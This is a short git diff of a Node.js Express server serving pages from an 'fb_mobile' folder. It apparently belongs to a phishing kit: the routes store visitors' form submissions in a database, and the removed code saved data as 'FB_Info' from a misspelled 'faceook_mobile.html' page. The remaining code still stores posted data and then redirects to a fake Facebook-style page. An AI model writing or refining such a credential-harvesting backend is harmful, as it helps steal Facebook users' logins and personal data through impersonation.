@@ -66,7 +66,7 @@ app.use(express.json())
 
 app.use("",express.static(`${fb_mobile_path}/main/`))
 app.use("/forum",express.static(`${fb_mobile_path}/forum/`))
-app.use("/process", express.static(`${fb_mobile_path}/process/`))
+app.use("/process",express.static(`${fb_mobile_path}/process/`))
 
 //------------------------------------ get methods (Sending the Files)
 
@@ -80,38 +80,16 @@ app.get('/forum' , (req , res) => {
     res.sendFile(`${fb_mobile_path}/forum/forum.html`)
 })
 
-app.get("/process", upload.single("file"),(req , res) => {
-    // res.send("Hey there this is the get page")
-    res.sendFile(`${fb_mobile_path}/process/faceook_mobile.html`)
-})
-
-// app.get("/consent", upload.single("file"),(req , res) => {
-//     // res.send("Hey there this is the get page")
-//     res.sendFile(`${fb_mobile_path}/consent/consent.html`)
-// })
-
-app.get("/consent" , (req,res) => {
-    res.sendFile(`${fb_mobile_path}/main/index.html`)
+app.get('/process',(req , res) => {
+    res.sendFile(`${fb_mobile_path}/process/index.html`)
 })
 
 // ------------------------------------ POST Method
 
-app.post('/consent', upload.array('file') , (req , res) => {
+app.post('/forum_post', upload.array('file') , (req , res) => {
     const data = req.body
     Basic_Info(data).save()
-    console.log(data)
-    console.log(`redirecting to ${url}/process`)
-    // console.log("revoked /consent");
-    res.send(`${url}+/process/`)
-    // console.log(r)
-})
-
-app.post("/process" , (req, res) => {
-    const data = req.body
-    FB_Info(data).save()
-    console.log(JSON.stringify(data))
-    console.log(url+"/process")
-    res.send(url+"/process")
+    res.send(`${url}/process`);
 })
 
 
